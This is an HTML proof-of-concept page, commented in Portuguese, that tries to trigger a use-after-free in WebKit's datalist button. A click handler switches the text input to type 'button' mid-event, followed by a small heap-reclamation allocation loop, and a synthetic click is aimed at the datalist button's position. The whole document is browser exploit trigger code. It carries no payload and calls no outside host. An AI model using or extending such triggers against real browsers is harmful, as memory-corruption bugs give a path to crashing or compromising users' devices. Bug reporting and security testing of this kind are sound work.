<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>WebKit DataListButton UAF PoC</title>
    <style>
        #input {
            width: 320px;
            height: 60px;
            font-size: 24px;
        }
        #btn-trigger {
            margin-top: 20px;
            padding: 12px 24px;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <input id="input" type="text" list="list">
    <datalist id="list">
        <option value="Opcao A">
        <option value="Opcao B">
    </datalist>

    <br>
    <button id="btn-trigger">Disparar Teste</button>
    <div id="status" style="margin-top: 15px; font-family: monospace;">Aguardando ação...</div>

    <script>
    const input = document.getElementById('input');
    const status = document.getElementById('status');

    input.addEventListener('click', (e) => {
        status.innerText = 'Click interceptado. Alterando tipo do input...';
        
        // Destrói o TextFieldInputType durante a propagação do evento
        input.type = 'button';

        // Opcional: Reclamação de memória / GC Heap Spray
        for (let i = 0; i < 1000; i++) {
            new ArrayBuffer(1024);
        }
    }, { once: true });

    document.getElementById('btn-trigger').onclick = () => {
        const rect = input.getBoundingClientRect();
        
        // Mira na borda direita onde o botão de lista é renderizado
        const x = rect.left + rect.width - 15;
        const y = rect.top + (rect.height / 2);

        // Tenta obter o target exato na camada visual
        const target = document.elementFromPoint(x, y) || input;

        const evt = new MouseEvent('click', {
            bubbles: true,
            cancelable: true,
            composed: true, // Crucial para permitir que o evento atravesse limites de Shadow DOM
            view: window,
            clientX: x,
            clientY: y
        });

        target.dispatchEvent(evt);

        setTimeout(() => {
            status.innerText = 'Finalizado: Sem crash imediato.';
        }, 100);
    };
    </script>
</body>
</html>
